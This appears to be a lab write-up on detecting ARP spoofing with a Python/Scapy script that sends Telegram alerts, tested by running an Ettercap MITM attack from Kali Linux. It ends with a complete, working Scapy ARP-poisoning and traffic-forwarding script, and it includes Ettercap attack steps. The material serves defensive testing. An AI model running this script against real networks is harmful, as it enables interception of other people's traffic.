# Tools required

1. **Telegram**
    - **BotFather**: Used to create and manage the Telegram bot.
    - **Telegram Bot**: Employed for sending alert notifications.
2. **Programming Languages and Libraries**
    - **Python**: Utilized as the primary language for scripting the detection and alert system.
    - **Scapy**: Used for packet manipulation and sniffing in Python.
    - **Requests**: Utilized for making HTTP requests to interact with the Telegram API.
    - **Collections**: Specifically, `defaultdict` from the `collections` module, is used for storing IP-MAC address mappings.
3. **Operating Systems**
    - **macOS**: Chosen as the victim operating system to demonstrate vulnerability to ARP spoofing.
    - **Kali Linux**: Used as the attacker machine for executing ARP MITM attacks with Ettercap.
4. **Networking Tools**
    - **Ettercap**: Used for performing ARP MITM attacks as part of a comprehensive suite for man-in-the-middle attacks on a LAN.
    - **Wireshark**: Employed to capture and analyze packets to verify ARP spoofing.
5. **Internet Access**
    - Required for communicating with the Telegram API and for any necessary software downloads or updates.

### Optional

- **Virtual Machines (VMs) or Physical Machines**: Depending on the setup, multiple machines or VMs might be needed to act as the victim, attacker, and possibly the network gateway.

# Creating and Using a Telegram Bot for ARP Spoofing/ Poisoning Detection

### Step 1: Create a Telegram Bot

![Screenshot 2024-05-30 at 20.21.22.png](IDS%20-%20Detecting%20ARP%20poisoning%20attack,%20send%20warning%20eea0180004ee4e5d9aebb434f8d5d81f/Screenshot_2024-05-30_at_20.21.22.png)

- Search for ‘**BotFather**’ on telegram
- Follow the instructions to create a new bot
- Copy the HTTP API token provided

## Step 2: Initiate Conversation with the Bot

![Screenshot 2024-05-30 at 20.28.07.png](IDS%20-%20Detecting%20ARP%20poisoning%20attack,%20send%20warning%20eea0180004ee4e5d9aebb434f8d5d81f/Screenshot_2024-05-30_at_20.28.07.png)

- Search for your bot by its username.
- Start the conversation.

## Step 3: Get the Chat ID

- Run the following Python code to get the chat ID:
    
    ```python
    TOKEN = 'PASTE YOUR TOKEN HERE'  
    import requests
    url = f"https://api.telegram.org./bot{TOKEN}/getUpdates"
    print(requests.get(url).json())
    ```
    
    ![01getChatID.py](IDS%20-%20Detecting%20ARP%20poisoning%20attack,%20send%20warning%20eea0180004ee4e5d9aebb434f8d5d81f/Screenshot_2024-05-30_at_20.33.27.png)
    
    01getChatID.py
    
- From the output, copy the value of ‘id’

## Step 4: Send a Test Message

- Run the following Python code to send a test message:
    
    ```python
    import requests
    
    TOKEN = 'ENTER TOKEN'  
    CHAT_ID = 'ENTER CHAT_ID'
    message = 'hello from python'
    url = f"https://api.telegram.org./bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={message}"
    r = requests.get(url)
    print(r.json)
    ```
    
- Ensure the message is successfully sent.
    
    ![Screenshot 2024-05-30 at 20.33.27.png](IDS%20-%20Detecting%20ARP%20poisoning%20attack,%20send%20warning%20eea0180004ee4e5d9aebb434f8d5d81f/Screenshot_2024-05-30_at_20.33.27%201.png)
    
    ![Message successfully sent](IDS%20-%20Detecting%20ARP%20poisoning%20attack,%20send%20warning%20eea0180004ee4e5d9aebb434f8d5d81f/Screenshot_2024-05-30_at_20.37.58.png)
    
    Message successfully sent
    

# The Exploit

## Step 1: Run the Detection Script on the Target Machine

- Run the following Python code to detect ARP spoofing
    
    ```python
    from scapy.all import *
    from collections import defaultdict
    import requests
    
    # Telegram Bot Configuration
    TOKEN = 'insertToken'
    CHAT_ID = '5374697150'
    telegram_api_url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    
    # Dictionary to store IP-MAC address mappings
    arp_table = defaultdict(set)
    
    # Function to send Telegram message
    def send_telegram_alert(ip, mac, previous_macs):
        message_text = f"[ALERT] ARP Spoofing detected:\nIP: {ip}\nMAC: {mac}\nPrevious MACs: {previous_macs}"
        payload = {
            'chat_id': CHAT_ID,
            'text': message_text
        }
        response = requests.post(telegram_api_url, data=payload)
        if response.status_code == 200:
            print("Telegram message sent successfully")
        else:
            print("Failed to send Telegram message")
    
    # Function to handle each packet
    def detect_arp_poisoning(packet):
        if packet.haslayer(ARP) and packet[ARP].op == 2:  # ARP reply is op=2
            ip = packet[ARP].psrc
            mac = packet[ARP].hwsrc
    
            # Check if the IP address is already in the table with a different MAC address
            if ip in arp_table and mac not in arp_table[ip]:
                print(f"[ALERT] ARP Spoofing detected: {ip} is being claimed by {mac}")
                print(f"Previous MAC addresses: {arp_table[ip]}")
                send_telegram_alert(ip, mac, arp_table[ip])
    
            # Update the ARP table
            arp_table[ip].add(mac)
    
    # Sniff ARP packets and apply the detection function
    print("Starting ARP spoofing detection...")
    sniff(filter="arp", prn=detect_arp_poisoning, store=0)
    
    ```
    

## Step 2: Execute ARP MITM Attack on the Attacker Machine

- **On the attacker machine (preferably Kali Linux), run ARP MITM attack using Ettercap**:
    - Add target’s IP as Target 1
    - Add router’s IP (default gateway) as Target 2
        
        ![Screenshot 2024-05-30 at 21.17.24.png](IDS%20-%20Detecting%20ARP%20poisoning%20attack,%20send%20warning%20eea0180004ee4e5d9aebb434f8d5d81f/Screenshot_2024-05-30_at_21.17.24.png)
        
    - Start MITM Attack: ARP Poisoning
        
        ![Screenshot 2024-05-30 at 21.15.07.png](IDS%20-%20Detecting%20ARP%20poisoning%20attack,%20send%20warning%20eea0180004ee4e5d9aebb434f8d5d81f/Screenshot_2024-05-30_at_21.15.07.png)
        

## Step 3: Verify ARP Spoofing Detection

- Check the output for ARP poisoning detection:
- Ensure the ARP spoofing detection alert is printed.
    
    ![Screenshot 2024-05-30 at 21.14.57.png](IDS%20-%20Detecting%20ARP%20poisoning%20attack,%20send%20warning%20eea0180004ee4e5d9aebb434f8d5d81f/Screenshot_2024-05-30_at_21.14.57.png)
    

- Verify that a warning message is sent through Telegram
    
    ![Screenshot 2024-05-30 at 21.15.18.png](IDS%20-%20Detecting%20ARP%20poisoning%20attack,%20send%20warning%20eea0180004ee4e5d9aebb434f8d5d81f/1289f3d8-798d-47f5-9037-c40548841751.png)
    
- Use Wireshark to capture packets and confirm that a duplicate IP address is detected.
    
    ![Screenshot 2024-05-30 at 21.23.33.png](IDS%20-%20Detecting%20ARP%20poisoning%20attack,%20send%20warning%20eea0180004ee4e5d9aebb434f8d5d81f/Screenshot_2024-05-30_at_21.23.33.png)
    

```python
#!/usr/bin/env python3
from scapy.all import *
from scapy.layers.l2 import Ether, ARP
import os
import sys
import time

packet_count = 0  # Global variable to count packets

def get_mac(ip):
    # Send ARP request to get the MAC address of the IP
    ans, unans = arping(ip, verbose=False)
    for snt, rcv in ans:
        return rcv[Ether].src
    return None

def spoof(target_ip, spoof_ip, target_mac):
    global packet_count
    # Create ARP response packet
    arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    ether = Ether(dst=target_mac)
    packet = ether / arp_response
    sendp(packet, verbose=False)
    packet_count += 1
    print(f"[*] Sent ARP spoof packet {packet_count} to {target_ip}")

def restore(target_ip, source_ip, target_mac, source_mac):
    global packet_count
    # Create ARP response packet to restore the ARP table
    arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
    ether = Ether(dst=target_mac)
    packet = ether / arp_response
    sendp(packet, count=4, verbose=False)
    packet_count += 4  # We are sending 4 packets in restore function
    print(f"[*] Sent ARP restore packets {packet_count - 3}-{packet_count} to {target_ip}")

def forward_packet(packet):
    if packet.haslayer(IP):
        # Check if the packet is from the target to the gateway
        if packet[IP].src == target_ip and packet[IP].dst == gateway_ip:
            packet[Ether].dst = gateway_mac
            sendp(packet, verbose=False)
        # Check if the packet is from the gateway to the target
        elif packet[IP].src == gateway_ip and packet[IP].dst == target_ip:
            packet[Ether].dst = target_mac
            sendp(packet, verbose=False)

if __name__ == "__main__":
    # User input for target and gateway IP addresses
    target_ip = input("Enter Target IP: ")
    gateway_ip = input("Enter Gateway IP: ")
    interface = input("Enter Network Interface (e.g., eth0, wlan0): ")

    # Get MAC addresses of target and gateway
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)

    if target_mac is None or gateway_mac is None:
        print("Failed to get MAC address. Exiting.")
        sys.exit(1)

    # Enable IP forwarding on the attacker machine
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    try:
        print("Starting ARP spoofing. Press Ctrl+C to stop.")
        while True:
            # Spoof the target
            spoof(target_ip, gateway_ip, target_mac)
            # Spoof the gateway
            spoof(gateway_ip, target_ip, gateway_mac)
            time.sleep(2)
            print(f"[*] Total packets sent: {packet_count}")
    except KeyboardInterrupt:
        print("\nStopping ARP spoofing. Restoring network configuration...")
        # Restore the network configuration
        restore(target_ip, gateway_ip, target_mac, gateway_mac)
        restore(gateway_ip, target_ip, gateway_mac, target_mac)
        # Disable IP forwarding
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("Network configuration restored. Exiting.")

```
